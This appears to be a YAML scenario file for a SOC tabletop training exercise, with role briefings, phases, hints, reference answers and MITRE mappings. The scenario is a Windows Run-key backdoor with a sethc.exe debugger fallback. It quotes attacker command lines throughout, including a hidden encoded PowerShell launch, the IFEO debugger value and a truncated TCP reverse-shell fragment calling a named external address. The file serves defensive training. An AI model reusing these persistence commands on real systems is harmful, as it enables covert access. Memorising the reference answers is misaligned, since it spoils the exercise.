@@ -1,0 +1,216 @@
+id: registry_persistence___windows_auto-start_backdoor
+name: Registry Persistence — Windows Auto-Start Backdoor
+category: Endpoint
+format_version: 2
+difficulty: Medium
+soc_tier: L1
+roles:
+- analyst
+- incident_manager
+- ciso
+- executive
+industries:
+- all
+briefings:
+  analyst: You are the Tier-1 SOC analyst on shift. Your SIEM has fired an alert. Triage the scope, identify compromised assets, and take initial containment actions. Preserve evidence and escalate to the incident manager when the incident exceeds L1 scope.
+  incident_manager: You are the Incident Manager coordinating the response to Registry Run Key Backdoor with Encoded PowerShell Payload. Drive containment, evidence preservation, escalation, and cross-team communications; keep the war-room bridge aligned and document every major decision.
+  ciso: You are the CISO accountable for Registry Run Key Backdoor with Encoded PowerShell Payload. Weigh business impact, legal and regulatory notification duties, customer commitments, and the risk of disruptive containment.
+  executive: You are the executive sponsor for Registry Run Key Backdoor with Encoded PowerShell Payload. Focus on business continuity, budget and resource approval, customer and partner communications, and the timing of external disclosure.
+executive_brief: 'Executive summary of the Registry Run Key Backdoor with Encoded PowerShell Payload incident. An attacker who gained local administrator access to WEB-SRV-02 (10.10.40.11, Windows Server 2019) created a persistent backdoor by adding a new entry to the HKLM\Software\Microsoft\Windows\CurrentVersion\Run registry key. The entry (''Windows Security Service'') executes a PowerShell command on every system startup and user logon: powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -enc <base64>. The base64 payload decodes to a reverse shell connecting to 198.51.100.85:8080. The encoded payload is stored in a separate registry value under HKLM\Software\CustomService\UpdateCheck. The attacker also created a second persistence point in the HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe key (Debugger = C:\Windows\System32\cmd.exe /c powershell -enc <base64>), providing a fallback persistence mechanism triggered by pressing Shift 5 times
+  at the login screen. Sysmon detected the Run key modification (Event ID 12/13, TargetObject: HKLM\...\Run\Windows Security Service) at 03:15 AM on March 11. The PowerShell network connection to 198.51.100.85:8080 was also flagged by the network security appliance. Business impact: endpoint availability and integrity are at risk, and affected hosts may need reimaging before normal work resumes. Immediate decisions: authorize containment that may interrupt service, preserve forensic evidence, and agree the external communication cadence with legal and communications. Regulatory exposure: privacy counsel should assess breach-notification duties once data access is confirmed.'
+incident:
+  title: Registry Run Key Backdoor with Encoded PowerShell Payload
+  opening: 'An attacker who gained local administrator access to WEB-SRV-02 (10.10.40.11, Windows Server 2019) created a persistent backdoor by adding a new entry to the HKLM\Software\Microsoft\Windows\CurrentVersion\Run registry key. The entry (''Windows Security Service'') executes a PowerShell command on every system startup and user logon: powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -enc <base64>.'
+  summary: 'An attacker who gained local administrator access to WEB-SRV-02 (10.10.40.11, Windows Server 2019) created a persistent backdoor by adding a new entry to the HKLM\Software\Microsoft\Windows\CurrentVersion\Run registry key. The entry (''Windows Security Service'') executes a PowerShell command on every system startup and user logon: powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -enc <base64>. The base64 payload decodes to a reverse shell connecting to 198.51.100.85:8080. The encoded payload is stored in a separate registry value under HKLM\Software\CustomService\UpdateCheck. The attacker also created a second persistence point in the HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe key (Debugger = C:\Windows\System32\cmd.exe /c powershell -enc <base64>), providing a fallback persistence mechanism triggered by pressing Shift 5 times at the login screen. Sysmon detected the Run key modification (Event ID 12/13, TargetObject: HKLM\...\Run\Windows
+    Security Service) at 03:15 AM on March 11. The PowerShell network connection to 198.51.100.85:8080 was also flagged by the network security appliance.'
+  compromised_assets:
+  - WEB-SRV-02 (10.10.40.11) — Windows Server 2019
+  - Windows Registry (HKLM Run key modified — 'Windows Security Service')
+  - System startup process (backdoor executes on every boot)
+  - sethc.exe debugger (fallback persistence via Sticky Keys)
+  - PowerShell reverse shell to 198.51.100.85:8080
+  - Registry value (HKLM\Software\CustomService\UpdateCheck — encoded payload)
+  detected_via: Sysmon registry modification alert (Event ID 12/13, Run key modification at 03:15 AM); PowerShell network connection to external IP (198.51.100.85:8080); startup program audit
+  kill_chain:
+  - Local administrator access obtained on WEB-SRV-02
+  - Encoded PowerShell payload stored in registry value (CustomService\UpdateCheck)
+  - HKLM Run key created for auto-start persistence ('Windows Security Service')
+  - sethc.exe debugger configured as fallback (Shift+Sticky Keys)
+  - System restart triggers backdoor execution
+  - Reverse shell established to 198.51.100.85:8080
+  mitre_tactics:
+  - TA0003 — Persistence
+  - TA0005 — Defense Evasion
+  - TA0011 — Command and Control
+phases:
+- id: registry_modification_detection
+  phase_type: triage
+  title: Registry Modification Detection
+  situation: 'Sysmon has detected a registry modification on WEB-SRV-02 (10.10.40.11) at 03:15 AM on March 11. Event ID 12/13 shows a new value ''Windows Security Service'' was added to HKLM\Software\Microsoft\Windows\CurrentVersion\Run. The value data is: powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -enc <base64_string>. A secondary registry value was added under HKLM\Software\CustomService\UpdateCheck containing the same base64 payload. The base64 decodes to a reverse shell: $client = New-Object System.Net.Sockets.TCPClient(''198.51.100.85'',8080);... The backdoor will execute on every system restart.'
+  prompt: How do you respond to the registry-based persistence?
+  guidance:
+    what: Establish what fired on WEB-SRV-02, which accounts are involved, and how urgent the signal is.
+    action: How do you respond to the registry-based persistence?
+    why: A wrong first read sends the whole response down the wrong path.
+  hint: 'Start with the alert itself: which asset, account, and time window are actually in scope? Focus: Registry Modification Detection. Asset in scope: WEB-SRV-02.'
+  hints:
+  - Application whitelisting is an excellent preventive measure but does not address the existing persistence.
+  - Consider pulling the relevant logs for the affected window.
+  ideal_concepts:
+  - immediately remove
+  - key entry
+  - entry windows
+  - windows security
+  - security service
+  - service delete
+  - customservice registry
+  - registry values
+  reference_answer: |-
+    Immediately remove the Run key entry ('Windows Security Service'), delete the CustomService registry values, block 198.51.100.85 at the perimeter, investigate the source of the local admin compromise, and deploy Sysmon with enhanced registry monitoring rules
+
+    Why: Removing the registry entries eliminates the persistence. IP blocking stops C2 communications. Investigation identifies the initial access vector. Enhanced Sysmon rules detect future modifications.
+  followup_good: 'Investigation of the registry modifications reveals a secondary persistence mechanism: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe with value Debugger = C:\Windows\System32\cmd.exe /c powershell -enc <base64>. This means pressing Shift 5 times at the login screen will execute the PowerShell reverse shell instead of the Sticky Keys accessibility feature. The IFEO debugger persistence is a well-known technique that survives Run key removal. Sysmon Event ID 13 captured the IFEO modification but the alert was not triaged.'
+  followup_weak: |-
+    Removing the registry entries eliminates the persistence.
+
+    Investigation of the registry modifications reveals a secondary persistence mechanism: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe with value Debugger = C:\Windows\System32\cmd.exe /c powershell -enc <base64>. This means pressing Shift 5 times at the login screen will execute the PowerShell reverse shell instead of the Sticky Keys accessibility feature. The IFEO debugger persistence is a well-known technique that survives Run key removal. Sysmon Event ID 13 captured the IFEO modification but the alert was not triaged.
+  next: fallback_persistence_via_debugger
+  mitre_tactic: TA0003 — Persistence
+  mitre_technique: T1547.001 — Registry Run Keys / Startup Folder
+- id: fallback_persistence_via_debugger
+  phase_type: containment
+  title: Fallback Persistence via Debugger
+  situation: 'Investigation of the registry modifications reveals a secondary persistence mechanism: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe with value Debugger = C:\Windows\System32\cmd.exe /c powershell -enc <base64>. This means pressing Shift 5 times at the login screen will execute the PowerShell reverse shell instead of the Sticky Keys accessibility feature. The IFEO debugger persistence is a well-known technique that survives Run key removal. Sysmon Event ID 13 captured the IFEO modification but the alert was not triaged.'
+  prompt: How do you address the IFEO debugger persistence?
+  guidance:
+    what: 'Balance speed against disruption: what must be isolated now, and what can wait for scoping?'
+    action: How do you address the IFEO debugger persistence?
+    why: Stopping the spread is urgent, but destroying evidence makes the incident impossible to close.
+  hint: 'Prioritize the move that limits blast radius without destroying the evidence you will need later. Focus: Fallback Persistence via Debugger. Asset in scope: WEB-SRV-02.'
+  hints:
+  - Removing the single entry is correct but does not address the systemic issue.
+  - Disabling Sticky Keys via GPO does not prevent IFEO abuse — the attacker can target other executables.
+  - SIEM correlation is valuable for detection but IFEO modifications should be prevented via application control, not just detected.
+  ideal_concepts:
+  - ifeo debugger
+  - debugger entry
+  - entry sethc
+  - sethc exe
+  - exe deploy
+  - deploy comprehensive
+  - comprehensive ifeo
+  - ifeo monitoring
+  reference_answer: |-
+    Remove the IFEO debugger entry for sethc.exe, deploy a comprehensive IFEO monitoring rule in Sysmon (alert on all IFEO debugger additions), implement application control policies preventing unauthorized IFEO modifications, and audit all IFEO keys across all endpoints
+
+    Why: Removing the IFEO entry eliminates the fallback persistence. Monitoring rules detect future modifications. Application control prevents unauthorized changes. Full audit identifies any other IFEO abuse.
+  followup_good: 'The PowerShell reverse shell payload has been decoded and analyzed: it connects to 198.51.100.85:8080 using a TCP socket, executes a download cradle to retrieve a second-stage Cobalt Strike beacon, and establishes a fully interactive reverse shell. The network security appliance has confirmed connections from WEB-SRV-02 to 198.51.100.85:8080 starting at 03:20 AM (5 minutes after registry modification, indicating the server was rebooted). The C2 channel has been active for approximately 48 hours. PowerShell script block logging (Event ID 4104) captured the full decoded payload including the C2 server address and second-stage download URL.'
+  followup_weak: |-
+    Removing the IFEO entry eliminates the fallback persistence.
+
+    The PowerShell reverse shell payload has been decoded and analyzed: it connects to 198.51.100.85:8080 using a TCP socket, executes a download cradle to retrieve a second-stage Cobalt Strike beacon, and establishes a fully interactive reverse shell. The network security appliance has confirmed connections from WEB-SRV-02 to 198.51.100.85:8080 starting at 03:20 AM (5 minutes after registry modification, indicating the server was rebooted). The C2 channel has been active for approximately 48 hours. PowerShell script block logging (Event ID 4104) captured the full decoded payload including the C2 server address and second-stage download URL.
+  next: startup_execution_c2_containment
+  mitre_tactic: TA0003 — Persistence
+  mitre_technique: T1546.012 — Image File Execution Options Injection
+- id: startup_execution_c2_containment
+  phase_type: eradication
+  title: Startup Execution & C2 Containment
+  situation: 'The PowerShell reverse shell payload has been decoded and analyzed: it connects to 198.51.100.85:8080 using a TCP socket, executes a download cradle to retrieve a second-stage Cobalt Strike beacon, and establishes a fully interactive reverse shell. The network security appliance has confirmed connections from WEB-SRV-02 to 198.51.100.85:8080 starting at 03:20 AM (5 minutes after registry modification, indicating the server was rebooted). The C2 channel has been active for approximately 48 hours. PowerShell script block logging (Event ID 4104) captured the full decoded payload including the C2 server address and second-stage download URL.'
+  prompt: How do you contain the C2 channel and remediate the system?
+  guidance:
+    what: Find every foothold the attacker left on WEB-SRV-02, including persistence and stolen credentials.
+    action: How do you contain the C2 channel and remediate the system?
+    why: Credentials and entry paths must be removed, not just the malware that used them.
+  hint: 'Look beyond the visible payload for persistence, stolen credentials, and the original entry path. Focus: Startup Execution & C2 Containment. Asset in scope: WEB-SRV-02.'
+  hints:
+  - Password reset does not address the registry persistence or the active C2 channel.
+  - EDR is valuable but does not address the existing persistence and C2.
+  - VM migration from clean template is thorough but time-consuming.
+  ideal_concepts:
+  - perimeter firewall
+  - firewall disable
+  - powershell execution
+  - execution web-srv-02
+  - web-srv-02 applocker
+  - applocker constrained
+  - constrained language
+  - language mode
+  reference_answer: |-
+    Block 198.51.100.85 at the perimeter firewall, disable PowerShell execution on WEB-SRV-02 via AppLocker (Constrained Language Mode), remove all registry persistence entries, audit all startup mechanisms (Run keys, IFEO, scheduled tasks, services) on the system, and deploy PowerShell Script Block Logging globally
+
+    Why: Firewall block stops C2 communications. AppLocker prevents future PowerShell abuse. Registry removal eliminates persistence. Full audit identifies all persistence mechanisms. Global logging provides detection capability.
+  followup_good: |-
+    The scenario ends here.
+
+    Executive summary of the Registry Run Key Backdoor with Encoded PowerShell Payload incident. An attacker who gained local administrator access to WEB-SRV-02 (10.10.40.11, Windows Server 2019) created a persistent backdoor by adding a new entry to the HKLM\Software\Microsoft\Windows\CurrentVersion\Run registry key. The entry ('Windows Security Service') executes a PowerShell command on every system startup and user logon: powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -enc <base64>. The base64 payload decodes to a reverse shell connecting to 198.51.100.85:8080. The encoded pa...
+  followup_weak: |-
+    The scenario ends here.
+
+    Executive summary of the Registry Run Key Backdoor with Encoded PowerShell Payload incident. An attacker who gained local administrator access to WEB-SRV-02 (10.10.40.11, Windows Server 2019) created a persistent backdoor by adding a new entry to the HKLM\Software\Microsoft\Windows\CurrentVersion\Run registry key. The entry ('Windows Security Service') executes a PowerShell command on every system startup and user logon: powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -enc <base64>. The base64 payload decodes to a reverse shell connecting to 198.51.100.85:8080. The encoded pa...
+  mitre_tactic: TA0011 — Command and Control
+  mitre_technique: T1059.001 — PowerShell
+  next: recovery_and_validation
+- id: recovery_and_validation
+  phase_type: recovery
+  title: Recovery & Validation
+  situation: Containment is holding and the attacker's active access has been removed. WEB-SRV-02 is quarantined or offline, and business owners are asking when service can resume. Backups, rebuild images, and a change window are available — but the root cause must be proven fixed first.
+  prompt: What must be true before you return WEB-SRV-02 to production?
+  guidance:
+    what: 'Define what ''clean'' means for WEB-SRV-02: trusted backups, rebuilt hosts, rotated credentials, and validated controls.'
+    action: What must be true before you return WEB-SRV-02 to production?
+    why: Recovery is only complete when the root cause is fixed and the restored asset is proven clean.
+  hint: 'Trusted backups and proof of cleanliness come before speed; a fast restore can reopen the incident. Focus: Recovery & Validation. Asset in scope: WEB-SRV-02.'
+  hints:
+  - Which backup or rebuild image is known-good for WEB-SRV-02, and when was it validated?
+  - Which credentials or certificates were exposed and must be rotated before restore?
+  - What monitoring will prove the attacker has not returned after service resumes?
+  ideal_concepts:
+  - known-good backup
+  - integrity validation
+  - credential rotation
+  - reinfection monitoring
+  - staged restoration
+  - business sign-off
+  reference_answer: |-
+    Restore WEB-SRV-02 from a known-good backup or rebuild it from a trusted image, validate system and data integrity, rotate every credential and certificate exposed during the incident, and monitor the restored environment for reinfection before handing it back to the business.
+
+    Why: Recovery is only complete when the root cause is fixed and the restored asset is proven clean; restoring compromised infrastructure reopens the incident.
+  followup_good: Services are restored in stages from trusted sources, exposed credentials are rotated, and monitoring confirms no reinfection. The business signs off on the restored service with evidence attached.
+  followup_weak: The asset is back online, but the root cause and credential exposure were not fully validated. The attacker still has a path back in, and the incident may reopen under a new alert.
+  next: post_incident_review
+  next_weak: ''
+  mitre_tactic: TA0011 — Command and Control
+  mitre_technique: T1059.001 — PowerShell
+  role_prompts: {}
+- id: post_incident_review
+  phase_type: lessons
+  title: Post-Incident Review & Hardening
+  situation: Service has been restored and validated. Leadership wants a concise after-action review covering the root cause of Registry Run Key Backdoor with Encoded PowerShell Payload, the detection gap that let the attacker operate, and the control changes that will prevent a repeat. Findings must have owners and dates.
+  prompt: What must change so an incident like Registry Run Key Backdoor with Encoded PowerShell Payload is detected earlier and cannot recur?
+  guidance:
+    what: Translate the incident into concrete detection, prevention, and response improvements.
+    action: What must change so an incident like Registry Run Key Backdoor with Encoded PowerShell Payload is detected earlier and cannot recur?
+    why: The post-incident review is what turns an incident into a defense.
+  hint: 'Turn this incident into one detection improvement and one preventive control that outlast the report. Focus: Post-Incident Review & Hardening. Asset in scope: WEB-SRV-02.'
+  hints:
+  - What was the earliest signal available, and why was it missed?
+  - Which control would have stopped the attack chain the earliest?
+  - Who owns each improvement, and when will it be verified?
+  ideal_concepts:
+  - root cause
+  - detection gap
+  - control improvement
+  - owner and date
+  - runbook update
+  - training
+  reference_answer: |-
+    Document the root cause of Registry Run Key Backdoor with Encoded PowerShell Payload, identify the detection gap that let the attacker operate, and assign owners and dates to concrete control changes. Update detections, runbooks, and training, track the actions to completion, and report the outcome to leadership.
+
+    Why: Without durable changes, the same root cause will produce the same incident again.
+  followup_good: The review names the root cause and detection gap, assigns owned and dated improvements, and ties them back to specific detections and controls. Leadership receives a tracked action plan.
+  followup_weak: The review retells the timeline but leaves the root cause and detection gap vague. Without owners, dates, and verification, the same incident will recur.
+  next: ''
+  next_weak: ''
+  mitre_tactic: TA0011 — Command and Control
+  mitre_technique: T1059.001 — PowerShell
+  role_prompts: {}
